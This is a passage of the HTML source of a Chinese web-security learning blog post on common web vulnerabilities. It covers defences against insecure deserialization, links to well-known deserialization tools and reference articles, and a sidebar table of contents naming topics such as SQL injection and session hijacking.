+<img src="/2025/02/26/web%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B/waFSuKbbQYWwq6YHnxtpv9.png" class title="img">
+
+<h2 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h2><p>对反序列数据加密或签名，且加密密钥和签名密钥不要使用硬编码</p>
+<p>对反序列化接口添加认证授权</p>
+<p>设置反序列化服务仅在本地监听或者设置相应防火墙策略</p>
+<p>禁止使用存在漏洞的第三方框架库</p>
+<p>过滤、禁用危险函数</p>
+<p>过滤T3协议或限定可连接的IP</p>
+<p>设置Nginx反向代理，实现t3协议和http协议隔离</p>
+<h2 id="常用工具"><a href="#常用工具" class="headerlink" title="***常用工具*****"></a><em>*<em>*</em>*常用工具****</em>*</h2><p>Java反序列化工具<a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial">YSoSerial.jar</a></p>
+<p>PHP反序列化工具<a target="_blank" rel="noopener" href="https://github.com/ambionics/phpggc">PHPGGC</a></p>
+<p>.NET反序列化工具<a target="_blank" rel="noopener" href="https://github.com/pwntester/ysoserial.net">YSoSerial.NET﻿</a></p>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="***参考文章*****"></a><em>*<em>*</em>*参考文章****</em>*</h2><p><a target="_blank" rel="noopener" href="https://paper.seebug.org/312/">深入理解 JAVA 反序列化漏洞</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2041">Java反序列化漏洞从入门到深入</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ssooking/p/5875215.html">Java反序列化漏洞分析</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.knownsec.com/2015/12/untrusted-deserialization-exploit-with-java/">从反序列化到命令执行 – Java 中的 POP 执行链﻿</a></p>
+<h1 id="DNSlog"><a href="#DNSlog" class="headerlink" title="DNSlog"></a>DNSlog</h1></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">J-Guardian</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2025/02/26/web%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B/">http://example.com/2025/02/26/web%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://example.com" target="_blank">网络安全学习</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2025/02/25/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/" title="二进制安全"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">二进制安全</div></div><div class="info-2"><div class="info-item-1">Windows逆向第一阶段：基础知识准备计算机体系结构 了解CPU、内存、寄存器、堆栈等基本概念 学习x86&#x2F;x64架构的基础知识 理解指令集（如MOV、PUSH、POP、CALL、JMP等）  操作系统基础 学习Windows操作系统的基本原理 理解进程、线程、内存管理、文件系统等概念 了解Windows...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">J-Guardian</div><div class="author-info-description">计算机网络、web安全、组件漏洞、SRC</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">5</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text">SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B4%E6%95%B0%E5%92%8C%E5%AD%97%E7%AC%A6%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.</span> <span class="toc-text">整数和字符注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5"><span class="toc-number">1.2.</span> <span class="toc-text">联合查询注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.</span> <span class="toc-text">报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-updatexml"><span class="toc-number">1.3.1.</span> <span class="toc-text">1.updatexml</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-floor"><span class="toc-number">1.3.2.</span> <span class="toc-text">2.floor</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-exp"><span class="toc-number">1.3.3.</span> <span class="toc-text">3.exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bool%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.4.</span> <span class="toc-text">Bool盲注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.5.</span> <span class="toc-text">时间盲注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="toc-number">1.6.</span> <span class="toc-text">二次注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#limit%E4%B9%8B%E5%90%8E%E7%9A%84%E6%B3%A8%E5%85%A5"><span class="toc-number">1.7.</span> <span class="toc-text">limit之后的注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E6%B3%A8%E5%85%A5%E7%82%B9%E4%BD%8D%E7%BD%AE"><span class="toc-number">1.8.</span> <span class="toc-text">常见的注入点位置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87"><span class="toc-number">1.9.</span> <span class="toc-text">绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%BF%87%E6%BB%A4%E5%85%B3%E9%94%AE%E5%AD%97"><span class="toc-number">1.9.1.</span> <span class="toc-text">1.过滤关键字</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC"><span class="toc-number">1.9.2.</span> <span class="toc-text">2.过滤空格</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%BF%87%E6%BB%A4%E5%8D%95%E5%BC%95%E5%8F%B7"><span class="toc-number">1.9.3.</span> <span class="toc-text">3.过滤单引号</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MySQL%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0"><span class="toc-number">1.10.</span> <span class="toc-text">MySQL常用函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E6%AD%A2SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">1.11.</span> <span class="toc-text">防止SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%B1%82%E9%9D%A2%EF%BC%9A"><span class="toc-number">1.11.1.</span> <span class="toc-text">***代码层面：*****</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E5%B1%82%E9%9D%A2%EF%BC%9A"><span class="toc-number">1.11.2.</span> <span class="toc-text">***网络层面：*****</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqlmap%E5%B7%A5%E5%85%B7"><span class="toc-number">1.12.</span> <span class="toc-text">sqlmap工具</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E6%A8%A1%E5%BC%8F"><span class="toc-number">1.12.1.</span> <span class="toc-text">***注入模式*****</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E6%95%B0"><span class="toc-number">1.12.2.</span> <span class="toc-text">***参数*****</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8"><span class="toc-number">1.12.3.</span> <span class="toc-text">使用</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6"><span class="toc-number">2.</span> <span class="toc-text">认证机制</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#HTTP-Basic-Auth-HTTP%E5%9F%BA%E6%9C%AC%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81"><span class="toc-number">2.1.</span> <span class="toc-text">HTTP Basic Auth(HTTP基本身份验证)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#OAuth-OAuth-%E5%BC%80%E6%94%BE%E6%8E%88%E6%9D%83"><span class="toc-number">2.2.</span> <span class="toc-text">OAuth OAuth(开放授权)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">2.2.1.</span> <span class="toc-text"></span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81%E6%8E%88%E6%9D%83%E7%A0%81%E6%A8%A1%E5%BC%8F%EF%BC%88Authorization-Code-Grant%EF%BC%89"><span class="toc-number">2.2.2.</span> <span class="toc-text">***1、授权码模式（Authorization Code Grant）*****</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81%E9%9A%90%E5%BC%8F%E6%8E%88%E6%9D%83%EF%BC%88Implicit-Grant%EF%BC%89"><span class="toc-number">2.2.3.</span> <span class="toc-text">2、隐式授权（Implicit Grant）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E3%80%81%E5%AF%86%E7%A0%81%E6%A8%A1%E5%BC%8F%EF%BC%88Resource-Owner-Password-Credentials-Grant%EF%BC%89"><span class="toc-number">2.2.4.</span> <span class="toc-text">3、密码模式（Resource Owner Password Credentials Grant）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4%E3%80%81%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%8E%88%E6%9D%83%E6%A8%A1%E5%BC%8F%EF%BC%88Client-Credentials-Grant%EF%BC%89"><span class="toc-number">2.2.5.</span> <span class="toc-text">4、客户端授权模式（Client Credentials Grant）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Cookie-OAuth"><span class="toc-number">2.3.</span> <span class="toc-text">Cookie OAuth</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Token-OAuth"><span class="toc-number">2.4.</span> <span class="toc-text">Token OAuth</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#session%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81"><span class="toc-number">2.5.</span> <span class="toc-text">session身份认证</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#session%E5%8A%AB%E6%8C%81"><span class="toc-number">2.6.</span> <span class="toc-text">session劫持</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%84%E5%88%99%E7%88%86%E7%A0%B4"><span class="toc-number">2.6.1.</span> <span class="toc-text">规则爆破</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8XSS"><span class="toc-number">2.6.2.</span> <span class="toc-text">利用XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-number">2.6.3.</span> <span class="toc-text">文件读取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%9A%E8%AF%9D%E5%9B%BA%E5%AE%9A%E5%8A%AB%E6%8C%81"><span class="toc-number">2.6.4.</span> <span class="toc-text">会话固定劫持</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Cookie%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81"><span class="toc-number">2.7.</span> <span class="toc-text">Cookie身份认证</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Cookie%E5%92%8CSESSION%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">2.8.</span> <span class="toc-text">***Cookie和SESSION的区别*****</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E4%BB%8E%E5%AD%98%E5%82%A8%E6%96%B9%E5%BC%8F%E4%B8%8A%E6%AF%94%E8%BE%83"><span class="toc-number">2.8.1.</span> <span class="toc-text">***1. 从存储方式上比较*****</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E4%BB%8E%E9%9A%90%E7%A7%81%E5%AE%89%E5%85%A8%E4%B8%8A%E6%AF%94%E8%BE%83"><span class="toc-number">2.8.2.</span> <span class="toc-text">***2. 从隐私安全上比较*****</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E4%BB%8E%E6%9C%89%E6%95%88%E6%9C%9F%E4%B8%8A%E6%AF%94%E8%BE%83"><span class="toc-number">2.8.3.</span> <span class="toc-text">***3. 从有效期上比较*****</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E4%BB%8E%E5%AF%B9%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E8%B4%9F%E6%8B%85%E6%AF%94%E8%BE%83"><span class="toc-number">2.8.4.</span> <span class="toc-text">***4. 从对服务器的负担比较*****</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E4%BB%8E%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84%E6%94%AF%E6%8C%81%E4%B8%8A%E6%AF%94%E8%BE%83"><span class="toc-number">2.8.5.</span> <span class="toc-text">***5. 从浏览器的支持上比较*****</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E4%BB%8E%E8%B7%A8%E5%9F%9F%E5%90%8D%E4%B8%8A%E6%AF%94%E8%BE%83"><span class="toc-number">2.8.6.</span> <span class="toc-text">***6. 从跨域名上比较*****</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-number">2.9.</span> <span class="toc-text">信息泄露</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB"><span class="toc-number">2.10.</span> <span class="toc-text">跨站脚本攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.11.</span> <span class="toc-text">越权漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BC%BA%E5%B0%91%E5%AE%89%E5%85%A8%E5%B1%9E%E6%80%A7"><span class="toc-number">2.12.</span> <span class="toc-text">缺少安全属性</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%98%93%E8%A2%AB%E7%8C%9C%E8%A7%A3%E7%9A%84Cookie"><span class="toc-number">2.13.</span> <span class="toc-text">易被猜解的Cookie</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">2.14.</span> <span class="toc-text">不安全的反序列化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL-Injection"><span class="toc-number">2.15.</span> <span class="toc-text">SQL Injection</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93"><span class="toc-number">2.16.</span> <span class="toc-text">参数污染</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-number">2.17.</span> <span class="toc-text">未授权访问</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Token%E8%AE%A4%E8%AF%81"><span class="toc-number">2.18.</span> <span class="toc-text">Token认证</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JWT"><span class="toc-number">2.19.</span> <span class="toc-text">JWT</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.</span> <span class="toc-text">反序列化漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">3.1.</span> <span class="toc-text">***简介*****</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%88%90%E5%9B%A0"><span class="toc-number">3.2.</span> <span class="toc-text">***成因*****</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">3.3.</span> <span class="toc-text">***原理*****</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Python"><span class="toc-number">3.4.</span> <span class="toc-text">Python</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP"><span class="toc-number">3.5.</span> <span class="toc-text">PHP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Java"><span class="toc-number">3.6.</span> <span class="toc-text">***Java*****</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B1%EF%BC%9A%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">3.6.1.</span> <span class="toc-text">例1：序列化和反序列化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B2-%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%90%8E%E4%BF%AE%E6%94%B9%E5%86%8D%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">3.6.2.</span> <span class="toc-text">例2:序列化之后修改再反序列化</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FastJson"><span class="toc-number">3.7.</span> <span class="toc-text">FastJson</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ASP-NET"><span class="toc-number">3.8.</span> <span class="toc-text">*ASP.NET*</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%96%B9%E6%B3%95"><span class="toc-number">3.9.</span> <span class="toc-text">防御方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7"><span class="toc-number">3.10.</span> <span class="toc-text">***常用工具*****</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">3.11.</span> <span class="toc-text">***参考文章*****</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#DNSlog"><span class="toc-number">4.</span> <span class="toc-text">DNSlog</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/02/26/web%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B/" title="web常见漏洞类型">web常见漏洞类型</a><time datetime="2025-02-26T07:44:15.000Z" title="发表于 2025-02-26 15:44:15">2025-02-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/02/25/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/" title="二进制安全">二进制安全</a><time datetime="2025-02-24T23:44:26.000Z" title="发表于 2025-02-25 07:44:26">2025-02-25</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/02/23/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/" title="操作系统安全">操作系统安全</a><time datetime="2025-02-23T08:08:55.000Z" title="发表于 2025-02-23 16:08:55">2025-02-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/02/23/%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/" title="学习计划">学习计划</a><time datetime="2025-02-23T06:36:25.000Z" title="发表于 2025-02-23 14:36:25">2025-02-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/02/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/" title="计算机网络">计算机网络</a><time datetime="2025-02-20T09:23:41.000Z" title="发表于 2025-02-20 17:23:41">2025-02-20</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2025 By J-Guardian</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.3.3</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
